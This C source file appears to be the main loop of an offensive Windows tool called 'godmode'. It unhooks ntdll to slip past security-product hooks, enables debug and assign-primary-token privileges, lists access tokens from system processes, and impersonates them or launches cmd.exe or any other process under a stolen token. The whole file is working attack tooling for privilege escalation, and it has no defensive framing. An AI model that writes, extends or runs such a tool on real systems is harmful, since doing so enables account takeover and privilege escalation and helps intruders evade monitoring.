#include <stdio.h>
#include <Windows.h>
#include <minwindef.h>
#include <winternl.h>

#include "unhook.h"
#include "systeminfo.h"
#include "token.h"
#include "syscalls.h"
#include "privileges.h"

typedef unsigned long DWORD;

#define MAX_COMMAND_BUFFER_LEN 256
#define PROMPT "\n# "

int main()
{
    int should_exit = FALSE;

    printf("[*] Unhooking ntdll...\n");
    unhookNtdll();
    HMODULE hNtdll = GetModuleHandle(L"ntdll.dll");

    if (!print_version(hNtdll))
    {
        return 1;
    }

    BOOL is_impersonating = FALSE;

    while (!should_exit)
    {
        printf(PROMPT);
        char command_buf[MAX_COMMAND_BUFFER_LEN];

        scanf_s("%255s", &command_buf, MAX_COMMAND_BUFFER_LEN);

        if (strcmp(command_buf, "exit") == 0)
        {
            should_exit = TRUE;
        }

        // ------------------------------------------------------------------------------------------------------------------
        // Priv Module 

        else if (strcmp(command_buf, "priv.debug") == 0)
        {
            enable_privilege(is_impersonating, SE_DEBUG_NAME);
        }

        else if (strcmp(command_buf, "priv.assign") == 0)
        {
            enable_privilege(is_impersonating, SE_ASSIGNPRIMARYTOKEN_NAME);
        }

        // ------------------------------------------------------------------------------------------------------------------
        // Token Module

        else if (strcmp(command_buf, "token.current") == 0)
        {
            // Access token
            HANDLE currentToken;
            OpenProcessToken(GetCurrentProcess(), TOKEN_READ, &currentToken);
            Token t;
            t.tokenHandle = currentToken;
            get_token_information(&t);
            printf("Access Token: %ws\n", t.tokenUsername);

            // Impersonation token
            t.tokenHandle = GetCurrentThreadToken();
            get_token_information(&t);
            printf("Impersonated Client: %ws\n", t.tokenUsername);
        }
        else if (strcmp(command_buf, "token.list") == 0)
        {
            Token availableTokens[1024];
            list_available_tokens(hNtdll, availableTokens);
        }
        else if ((strcmp(command_buf, "token.cmd") == 0) || (strcmp(command_buf, "token.run") == 0))
        {
            if (!enable_privilege(is_impersonating, SE_IMPERSONATE_NAME))
            {
                printf("[!] SeImpersonatePrivilege is needed for token impersonation");
                continue;
            }

            Token availableTokens[1024];
            list_available_tokens(hNtdll, availableTokens);

            printf("Enter token ID to use: ");
            int token_id;
            scanf_s("%d", &token_id);
            printf("\n"); 

            if (strcmp(command_buf, "token.cmd") == 0)
            {
                run_cmd(&availableTokens[token_id], L"C:\\Windows\\system32\\cmd.exe");
            }
            else // token.run
            {
                printf("Enter command to run: ");
                wchar_t cmd_to_run[MAX_PATH];
                scanf_s("%ws", cmd_to_run, MAX_PATH);
                run_cmd(&availableTokens[token_id], cmd_to_run);
            }
        }
        else if (strcmp(command_buf, "token.impersonate") == 0)
        {
            if (!enable_privilege(is_impersonating, SE_IMPERSONATE_NAME))
            {
                printf("[!] SeImpersonatePrivilege is needed for token impersonation");
                continue;
            }

            Token availableTokens[1024];
            list_available_tokens(hNtdll, availableTokens);

            printf("Enter token ID to use: ");
            int token_id;
            scanf_s("%d", &token_id);
            printf("\n");

            is_impersonating = impersonate(&availableTokens[token_id]);
        }
        else if (strcmp(command_buf, "token.revert") == 0)
        {
            RevertToSelf();
            is_impersonating = FALSE;
        }

        // ------------------------------------------------------------------------------------------------------------------

        else
        {
            printf("priv module:\n");
            printf("\tpriv.debug - enable debug priv\n");
            printf("\tpriv.assign - enable assignprimarytoken priv\n\n");
            printf("token module:\n");
            printf("\ttoken.current - show current security tokens\n");
            printf("\ttoken.revert - revert to self\n");
            printf("\ttoken.list - list available tokens for all system processes\n");
            printf("\ttoken.cmd - run cmd.exe with a token from token.list\n");
            printf("\ttoken.run - run any process with a token from token.list\n");
            printf("\ttoken.impersonate - impersonate a token from token.list\n\n");
            printf("\texit - exit godmode\n");
        }
    }

    return 0;
}
